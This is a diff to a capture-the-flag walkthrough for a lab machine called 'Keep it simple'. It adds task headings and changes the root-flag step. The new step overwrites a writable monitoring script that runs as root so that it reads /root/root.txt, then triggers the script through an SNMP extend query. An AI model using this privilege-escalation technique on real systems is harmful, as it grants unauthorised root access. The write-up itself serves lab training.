@@ -1,7 +1,10 @@
 # Keep it simple
 
-Connect to the machine 10.10.X.X using SSH an log in.
+## Task1
+Start the machine, connect to 10.10.X.X using SSH an log in.
 
+
+## Task2
 First off lets see if there is anything interesting in the home directory;
 
     [monitor@simple ~]$ ls
@@ -55,7 +58,10 @@ We have now learned that as well as reporting on the usual system and networking
 
 Looking at todo list task 2 we can get the idea that script names used here have not been standardised.  Don't know what that means but we can keep this in mind for later.
 
-As we now know from todo list task 1 & our own research SNMP is our prime interest.  
+As we now know from todo list task 1 & our own research we now know the answer to task 2!
+
+## Task3
+How to ge that root flag?
 
 Let's see if an SNMP server is running on our host;
 
@@ -163,11 +169,10 @@ Great!
 
 We have found a way to run check_temp.sh so let's use it to grab the root flag!
 
-    [monitor@simple ~]$ echo "cp /root/root.txt /tmp/flag" >> /usr/local/bin/monitoring/check_temp.sh
+    [monitor@simple ~]$ echo "cat /root/root.txt" > /usr/local/bin/monitoring/check_temp.sh
+    [monitor@simple ~]$ snmpget -v 2c -c ****** 127.0.0.1 'NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."check-temp"'
+    NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."check-temp" = STRING: *************************
 
-    [monitor@simple ~]$ snmpget -v 2c -c ****** 127.0.0.1 'NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."check-temp"' && cat /tmp/flag
-    NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."check-temp" = STRING: 37.5
-    ******************
 
 
 Thanks for reading!
